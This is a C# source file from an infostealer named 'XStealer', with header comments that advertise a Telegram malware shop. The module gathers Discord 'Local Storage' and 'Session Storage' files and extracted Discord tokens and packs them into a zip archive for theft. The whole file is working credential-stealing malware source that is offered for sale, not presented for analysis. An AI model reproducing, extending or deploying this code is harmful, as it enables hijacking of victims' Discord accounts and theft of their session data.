// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Modules.Apps.Discord
{
    using System.IO;
    using System.Linq;
    using Helpers;

    public static class Storage
    {
        /// <summary>
        /// <br><b>RUS</b></br><br>Метод для сбора всех файлов сессии из папки Дискорда</br>
        /// <br><b>ENG</b></br><br>Method for collecting all session files from the Discord folder</br>
        /// </summary>
        public static void GetData()
        {
            // Папки из которых будем копировать все данные
            var dirs = new string[2] { "Local Storage", "Session Storage" };
            // Проходися циклом
            for (int i = 0; i < dirs.Length; i++)
            {
                try
                {
                    foreach (string newPath in Directory.EnumerateDirectories(GlobalPaths.DiscordPath, dirs[i], SearchOption.AllDirectories).SelectMany(
                    dirPath => Directory.EnumerateFiles(dirPath, "*.*", SearchOption.AllDirectories)).Where(newPath => new FileInfo(newPath).Length > 0))
                    {
                        ZipEx.AddKeyPairStream($"Discord/{GlobalPaths.CombinePath(dirs[i], Path.GetFileName(newPath))}", ConverterEx.ToBytes(false, newPath));
                    }
                }
                catch { continue; }
            }
            ZipEx.AddKeyPairStream("Discord/Tokens.txt", Tokens.GetData());
        }
    }
}